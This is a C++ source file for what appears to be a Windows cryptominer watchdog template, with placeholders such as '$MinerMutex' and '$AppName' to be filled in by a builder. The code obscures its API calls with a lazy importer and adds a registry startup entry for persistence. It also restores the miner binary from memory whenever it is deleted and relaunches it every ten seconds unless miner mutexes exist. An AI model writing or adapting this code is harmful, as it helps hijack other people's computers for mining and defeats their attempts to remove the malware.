#include <windows.h>
#include <stdio.h>
#include <mutex> 
#include <string>
#include <filesystem>
#include "common_util.h"
#include <shlobj.h>
#include <iostream>
#include <vector>
#include "lib/lazy_importer.hpp"

#define MAX_LENGTH 500


int main (){

    std::string StartUpBasePath = getenv("$StartUpBasePath");


    std::string startupPath = "$startupPath";
    std::string MonerPath = "$MonerPath";
    std::string MonerMutex = "$MinerMutex";
    std::string xmMutex = "DDRTHyper";
        std::string ServiceName = "$AppName";
    
    std::string StartUpFullPath = StartUpBasePath + "\\" + startupPath;
    std::vector<char> minerBytes =  readAllBytes(StartUpFullPath);

    
    // create mutex 
    HANDLE mutex = CreateMutexW(nullptr, FALSE, L"$WatchdogMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS){
        return 0;
    }
    
    #if true
        // Call function with desired values.
    if (!AddRegistryValue(StartUpFullPath, ServiceName.c_str()))
    {

    }else{
        printf("Registry value added successfully.\n");
    }
    
    


    #endif
    




    while (true){

        Sleep(10000);
       
        if (!fileExists(StartUpFullPath))
        {
            writeAllBytes(StartUpFullPath, minerBytes);
        }
        
        if (!mutexExists(xmMutex)&& !mutexExists(MonerMutex))
        {
            runProcess(StartUpFullPath.c_str());            
        }
        

    
    }

    LI_FN(CloseHandle)(mutex);
    return 0;

}